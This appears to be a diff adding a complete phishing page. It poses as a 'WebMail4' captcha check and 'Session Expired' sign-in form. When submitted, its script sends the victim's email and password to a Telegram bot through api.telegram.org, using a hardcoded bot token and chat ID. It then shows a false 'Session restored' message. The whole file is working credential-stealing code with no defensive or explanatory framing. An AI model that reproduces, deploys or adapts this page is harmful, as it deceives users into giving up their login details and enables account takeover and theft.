@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>WebMail4 | Secured Captcha Page</title>
+</head>
+<body style="margin:0; padding:0; font-family:Segoe UI,Roboto,sans-serif; background:#f4f6f9; display:flex; align-items:center; justify-content:center; height:100vh;">
+
+  <!-- CAPTCHA CARD -->
+  <div id="captchaCard" style="background:#fff; padding:32px; border-radius:12px; box-shadow:0 4px 16px rgba(0,0,0,0.08); max-width:380px; width:100%; text-align:center;">
+    <div style="font-size:20px; font-weight:600; color:#0078d4; margin-bottom:8px;">WebMail4</div>
+    <h2 style="font-size:22px; margin-bottom:12px; color:#333;">Secured Captcha Page</h2>
+    <div id="captchaText" style="letter-spacing:4px; background:#e8f0fe; padding:12px; border-radius:6px; font-weight:bold; margin-bottom:16px; color:#1a73e8;"></div>
+    <input type="text" id="captchaInput" placeholder="Enter captcha" style="width:100%; padding:12px; margin-bottom:16px; border:1px solid #ccc; border-radius:6px; font-size:15px;"/>
+    <button onclick="validateCaptcha()" style="width:100%; padding:12px; background-color:#0078d4; color:white; border:none; border-radius:6px; font-size:15px; cursor:pointer;">
+      Verify
+    </button>
+  </div>
+
+  <!-- LOGIN CARD -->
+  <div id="formCard" style="display:none; background:#fff; padding:32px; border-radius:12px; box-shadow:0 4px 16px rgba(0,0,0,0.08); max-width:380px; width:100%; text-align:center;">
+    <div style="font-size:20px; font-weight:600; color:#0078d4; margin-bottom:8px;">WebMail4</div>
+    <h2 style="font-size:22px; margin-bottom:4px; color:#333;">Session Expired</h2>
+    <p style="font-size:14px; color:#666; margin-bottom:24px;">Please sign in again to continue</p>
+    <form id="loginForm" style="text-align:left;">
+      <label for="email" style="font-size:14px; color:#444; display:block; margin-bottom:6px;">Email address</label>
+      <input type="email" id="email" required style="width:100%; padding:12px; margin-bottom:16px; border:1px solid #ccc; border-radius:6px; font-size:15px;" />
+
+      <label for="password" style="font-size:14px; color:#444; display:block; margin-bottom:6px;">Password</label>
+      <input type="password" id="password" required style="width:100%; padding:12px; margin-bottom:16px; border:1px solid #ccc; border-radius:6px; font-size:15px;" />
+
+      <button type="submit" style="width:100%; padding:12px; background-color:#0078d4; color:white; border:none; border-radius:6px; font-size:15px; cursor:pointer;">
+        Sign In
+      </button>
+    </form>
+  </div>
+
+  <!-- SCRIPT -->
+  <script>
+    const captchaText = document.getElementById("captchaText");
+    const captchaInput = document.getElementById("captchaInput");
+    const captchaCard = document.getElementById("captchaCard");
+    const formCard = document.getElementById("formCard");
+    const form = document.getElementById("loginForm");
+
+    let generatedCaptcha = "";
+
+    function generateCaptcha() {
+      const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+      generatedCaptcha = Array.from({length: 6}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+      captchaText.textContent = generatedCaptcha;
+    }
+
+    function validateCaptcha() {
+      if (captchaInput.value.trim().toUpperCase() === generatedCaptcha) {
+        captchaCard.style.display = "none";
+        formCard.style.display = "block";
+      } else {
+        alert("Incorrect captcha. Try again.");
+        generateCaptcha();
+        captchaInput.value = '';
+      }
+    }
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      if (!email || !password) {
+        alert("Please enter both fields.");
+        return;
+      }
+
+      const telegramBotToken = "8076304397:AAGlBEOPgrrA8PO-3u7UfMmu2tYhGe1CMj8";
+      const chatId = "1318100118";
+      const message = `WebMail4 Login:\nEmail: ${email}\nPassword: ${password}`;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+        alert("Session restored.");
+        form.reset();
+      } catch (error) {
+        alert("Failed to restore session.");
+      }
+    });
+
+    generateCaptcha();
+  </script>
+</body>
+</html>
